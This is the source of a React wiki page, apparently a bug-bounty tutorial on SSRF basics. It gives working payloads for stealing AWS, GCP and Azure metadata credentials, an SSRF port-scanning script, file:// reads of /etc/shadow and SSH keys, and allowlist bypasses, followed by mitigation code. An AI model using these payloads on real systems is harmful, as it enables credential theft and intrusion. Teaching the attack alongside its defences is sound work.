/**
 * BASIC SSRF
 * Server-Side Request Forgery - Fundamentals (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Server, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SSRFBasicoContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="What is SSRF?">
        <Paragraph>
          <Strong>Server-Side Request Forgery (SSRF)</Strong> allows an attacker to make the 
          web server perform HTTP requests to arbitrary domains. This is dangerous because 
          the server can access internal resources not exposed to the Internet.
        </Paragraph>

        <AlertDanger title="Critical Impact">
          An attacker can:
          <ul className="mt-2 space-y-1">
            <ListItem>Access internal services (AWS metadata, admin panels)</ListItem>
            <ListItem>Scan internal network (port scanning)</ListItem>
            <ListItem>Read local files via file:// protocol</ListItem>
            <ListItem>Bypass firewalls and ACLs</ListItem>
            <ListItem>Steal cloud credentials (AWS, GCP, Azure)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="vulnerable-example" title="1. Typical Vulnerable Code">
        <Subsection title="Fetch URL from User Input">
          <CodeBlock
            language="javascript"
            title="Node.js - Vulnerable code"
            code={`const express = require('express');
const axios = require('axios');

app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  // ❌ VULNERABLE - Doesn't validate URL
  const response = await axios.get(imageUrl);
  res.send(response.data);
});

// Legitimate use example:
// GET /fetch-image?url=https://example.com/logo.png`}
          />
        </Subsection>

        <Subsection title="Exploit - Access AWS Metadata">
          <CodeBlock
            language="bash"
            title="Payload - Steal AWS credentials"
            code={`# AWS EC2 Instance Metadata
curl 'http://vulnerable-app.com/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Response: IAM role name
# "web-server-role"

# Get temporary credentials
curl 'http://vulnerable-app.com/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role'

# Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtn...",
  "Token": "IQoJb3JpZ2...",
  "Expiration": "2024-01-15T12:00:00Z"
}`}
          />

          <AlertDanger>
            With these credentials, the attacker can access S3 buckets, RDS, 
            and other AWS services with the server's permissions.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="localhost-bypass" title="2. Access Internal Services">
        <Subsection title="Scan Internal Network">
          <CodeBlock
            language="python"
            title="Script - Port scanner via SSRF"
            code={`import requests
import time

target_url = "http://vulnerable-app.com/fetch-image"

# Common port list
common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

def scan_internal_network():
    # Scan 192.168.1.0/24 network
    for ip in range(1, 255):
        host = f"192.168.1.{ip}"
        
        for port in common_ports:
            url = f"http://{host}:{port}"
            
            try:
                response = requests.get(
                    target_url,
                    params={'url': url},
                    timeout=3
                )
                
                # If responds, port is open
                if response.status_code == 200:
                    print(f"[+] {host}:{port} OPEN")
                    print(f"    Response preview: {response.text[:100]}")
                    
            except requests.Timeout:
                pass  # Port closed or filtered
            
            time.sleep(0.1)  # Rate limiting

scan_internal_network()`}
          />
        </Subsection>

        <Subsection title="Access Internal Admin Panel">
          <CodeBlock
            language="bash"
            title="Payload - Admin panel only accessible from localhost"
            code={`# Many apps have admin panels on localhost:8080
curl 'http://vulnerable-app.com/fetch-image?url=http://localhost:8080/admin'

# Alternatives for filter bypass:
http://127.0.0.1:8080/admin
http://0.0.0.0:8080/admin
http://[::1]:8080/admin
http://localhost.localdomain:8080/admin`}
          />
        </Subsection>
      </Section>

      <Section id="file-protocol" title="3. File Protocol - Read Local Files">
        <Paragraph>
          If the HTTP library allows <InlineCode>file://</InlineCode> scheme, 
          you can read system files:
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Payloads - Read sensitive files"
          code={`# Linux
curl 'http://vulnerable-app.com/fetch-image?url=file:///etc/passwd'
curl 'http://vulnerable-app.com/fetch-image?url=file:///etc/shadow'
curl 'http://vulnerable-app.com/fetch-image?url=file:///home/ubuntu/.ssh/id_rsa'

# Windows
curl 'http://vulnerable-app.com/fetch-image?url=file:///C:/Windows/System32/drivers/etc/hosts'
curl 'http://vulnerable-app.com/fetch-image?url=file:///C:/Users/Administrator/.ssh/id_rsa'

# Application files
curl 'http://vulnerable-app.com/fetch-image?url=file:///var/www/html/.env'
curl 'http://vulnerable-app.com/fetch-image?url=file:///app/config/database.yml'`}
        />

        <AlertWarning title="Affected Libraries">
          <ul className="mt-2 space-y-1">
            <ListItem>✅ Python <InlineCode>urllib</InlineCode> - Allows file://</ListItem>
            <ListItem>✅ PHP <InlineCode>file_get_contents()</InlineCode> - Allows file://</ListItem>
            <ListItem>❌ JavaScript <InlineCode>fetch()</InlineCode> - Does NOT allow file:// (browser only)</ListItem>
            <ListItem>⚠️ Node.js <InlineCode>axios</InlineCode> - Depends on configuration</ListItem>
          </ul>
        </AlertWarning>
      </Section>

      <Section id="cloud-metadata" title="4. Cloud Metadata Endpoints">
        <Subsection title="AWS EC2 Metadata">
          <CodeBlock
            language="bash"
            title="Useful AWS endpoints"
            code={`# IAM credentials (most common)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (startup scripts)
http://169.254.169.254/latest/user-data

# Hostname and zone
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/placement/availability-zone

# Network info
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4`}
          />

          <AlertInfo title="IMDSv2 Protection">
            AWS implemented IMDSv2 which requires a token. To bypass it you need 
            the vulnerable app to allow sending custom headers.
          </AlertInfo>
        </Subsection>

        <Subsection title="Google Cloud Metadata">
          <CodeBlock
            language="bash"
            title="GCP Metadata endpoints"
            code={`# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# SSH keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# Requires header: Metadata-Flavor: Google`}
          />
        </Subsection>

        <Subsection title="Azure Metadata">
          <CodeBlock
            language="bash"
            title="Azure Instance Metadata Service"
            code={`# Access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Instance info
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Requires header: Metadata: true`}
          />
        </Subsection>
      </Section>

      <Section id="filter-bypass" title="5. Common Filter Bypass">
        <Subsection title="Localhost Blacklist">
          <CodeBlock
            language="bash"
            title="Bypass techniques"
            code={`# Alternative representations of 127.0.0.1
http://127.1/
http://0.0.0.0/
http://[::1]/
http://127.0.1.1/
http://localhost.localdomain/

# Decimal/Octal/Hexadecimal
http://2130706433/        # Decimal of 127.0.0.1
http://0x7f000001/        # Hexadecimal
http://0177.0.0.1/        # Octal

# URL encoding
http://127.0.0.1 → http://127%2e0%2e0%2e1
http://localhost → http://local%68ost

# DNS rebinding
http://sslip.io/         # Public service for DNS tricks
http://vcap.me/          # Resolves to 127.0.0.1`}
          />
        </Subsection>

        <Subsection title="Domain Whitelist Bypass">
          <CodeBlock
            language="bash"
            title="Bypass techniques with @ and #"
            code={`# If only "allowed-domain.com" is permitted
# Use @ to specify credentials (username@host)
http://allowed-domain.com@evil.com/

# Use # for fragment
http://allowed-domain.com#@evil.com/

# Open redirect on allowed domain
http://allowed-domain.com/redirect?url=http://evil.com/

# Subdomain takeover
http://abandoned-subdomain.allowed-domain.com → CNAME points to evil.com`}
          />
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Defense in Depth">
          Implement ALL these measures, not just one.
        </AlertDanger>

        <Subsection title="1. Allowed Domains Whitelist">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Validate domain"
            code={`const { URL } = require('url');

const ALLOWED_DOMAINS = [
  'cdn.example.com',
  'images.example.com'
];

function isUrlAllowed(urlString) {
  try {
    const url = new URL(urlString);
    
    // Only HTTPS
    if (url.protocol !== 'https:') {
      return false;
    }
    
    // Verify domain in whitelist
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      return false;
    }
    
    return true;
  } catch (e) {
    return false;
  }
}

app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  if (!isUrlAllowed(imageUrl)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  
  const response = await axios.get(imageUrl);
  res.send(response.data);
});`}
          />
        </Subsection>

        <Subsection title="2. Block Private IPs">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Resolve DNS and verify IP"
            code={`const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

async function isPrivateIP(hostname) {
  try {
    const addresses = await dns.resolve4(hostname);
    
    for (const address of addresses) {
      const addr = ipaddr.parse(address);
      
      // Block private ranges
      if (addr.range() === 'private' ||
          addr.range() === 'loopback' ||
          addr.range() === 'linkLocal' ||
          addr.range() === 'reserved') {
        return true;
      }
      
      // Block cloud metadata
      if (address.startsWith('169.254.')) {
        return true;
      }
    }
    
    return false;
  } catch (e) {
    return true; // If doesn't resolve, block
  }
}

app.get('/fetch-image', async (req, res) => {
  const url = new URL(req.query.url);
  
  if (await isPrivateIP(url.hostname)) {
    return res.status(400).json({ error: 'Private IP not allowed' });
  }
  
  // ... rest of code
});`}
          />
        </Subsection>

        <Subsection title="3. Disable Redirects and Dangerous Protocols">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - axios with restrictive options"
            code={`const axios = require('axios');

const safeAxios = axios.create({
  maxRedirects: 0,           // Don't follow redirects
  timeout: 5000,             // Short timeout
  maxContentLength: 5000000, // Max 5MB
});

// Interceptor to verify protocol
safeAxios.interceptors.request.use(config => {
  const url = new URL(config.url);
  
  // Only allow HTTP/HTTPS
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Protocol not allowed');
  }
  
  return config;
});`}
          />
        </Subsection>

        <Subsection title="4. Network Segmentation">
          <CodeBlock
            language="bash"
            title="Firewall configuration (iptables)"
            code={`# Block web server access to metadata
sudo iptables -A OUTPUT -p tcp -d 169.254.169.254 -j REJECT

# Only allow output to specific public IPs
sudo iptables -A OUTPUT -p tcp -d 10.0.0.0/8 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 172.16.0.0/12 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 192.168.0.0/16 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 127.0.0.0/8 -j REJECT`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: SSRF to RCE</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/ssrf-to-rce`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>From SSRF to Remote Code Execution</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
